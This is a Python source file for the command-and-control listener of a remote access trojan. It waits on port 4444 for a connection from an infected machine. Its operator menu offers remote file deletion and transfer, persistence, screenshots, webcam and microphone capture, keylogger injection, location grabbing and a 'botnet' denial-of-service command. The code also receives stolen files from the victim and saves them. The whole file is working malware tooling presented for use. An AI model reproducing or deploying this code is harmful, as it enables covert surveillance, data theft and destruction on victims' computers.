import socket
import base64
import sys
import time
import simplejson


class SocketListener:
    def __init__(self,ip,port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        my_listener.bind((ip, port))
        my_listener.listen(0)
        print("Listening...")
        (self.my_connection, my_address) = my_listener.accept()
        print("Connection OK from " + str(my_address))

    def json_send(self,data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(2048).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def command_execution(self, command_input):
        self.json_send(command_input)

        if command_input[0] == "quit":
            self.my_connection.close()
            exit()

        return self.json_receive()

    def save_file(self,path,content):
        with open(path,"wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Download OK"

    def get_file_content(self,path):
        with open(path,"rb") as my_file:
            return base64.b64encode(my_file.read())

    def start_listener(self):
        while True:
            print("""
            --> Default Command
            -------------------------------------------------
            1-) 'see'                  Directory List
            2-) 'close'                Close PC
            4-) 'start'                Start EXE,DİCT...
            5-) 'quit'                 Close Backdoor and Revome,Clear All Data
            6-) 'closebackdoor'        Close Listener and Backdoor Auto Login Function Activate
            -------------------------------------------------
            
            
            --> Dict
            -------------------------------------------------
            1-) 'remove'               Remove Data
            2-) 'rename'               Rename Data
            3-) 'renamespace'          2 Space Rename Data
            4-) 'removespace'          2 Space Remove Data
            5-) 'doublespacerename'    3 Space Rename Data
            6-) 'doublespaceremove'    3 Space Remove Data
            7-) 'search' path .xx      Search Data
            -------------------------------------------------
            
            
            --> CD
            -------------------------------------------------
            1-) 'cd'                   Get CD Dict
            2-) 'spacecd'              Space CD
            3-) 'doublespacecd'        Double Space CD
            -------------------------------------------------
            

            --> Networking
            -------------------------------------------------
            1-) 'download'             Download Data
            2-) 'upload'               Upload Data
            -------------------------------------------------
            
            
            --> Exploit
            -------------------------------------------------
            1-) 'strojan'                       Store it in a safe place and run when you start it.
            2-) 'screenshot screen.png'         Screenshot Download
            3-) 'microphonetext tr              MicroPhone To Text Array
            4-) 'microphonesound kayıt.wav      MicroPhone to MP3
            5-) 'blockkey 'key'                 Block Onboard Key
            6-) 'write key'                     Write Key
            7-) 'locasion'                      GET Locasion Address
            8-) 'webcamscreenshot scr.jpg'      Capture to JPG
            9-) 'keylogger int'                 Injection Keylogger
            10-) 'botnet'                       Denial Of Service Attack     
            11-) 'screensize'                   Monıtor Size Return
            12-) 'click'                        Upload Target PNG and Write 'click' Command
            -------------------------------------------------
            

                            	""")
            command_input = input("Enter command: ")
            if command_input == "closelistener":
                break
            command_input = command_input.split(" ")
            try:
                if command_input[0] == "upload":
                    my_file_content = self.get_file_content(command_input[1])
                    command_input.append(my_file_content)

                command_output = self.command_execution(command_input)

                if command_input[0] == "webcamscreenshot" and "Error!" not in command_output:
                    command_output = self.save_file(command_input[1],command_output)

                if command_input[0] == "microphonesound" and "Error!" not in command_output:
                    command_output = self.save_file(command_input[1],command_output)

                if command_input[0] == "download" and "Error!" not in command_output:
                    command_output = self.save_file(command_input[1],command_output)

                if command_input[0] == "screenshot" and "Error!" not in command_output:
                    command_output = self.save_file(command_input[1],command_output)

            except Exception:
                command_output = "Error"
            print(command_output)

my_socket_listener = SocketListener("192.168.1.100",4444)
my_socket_listener.start_listener()
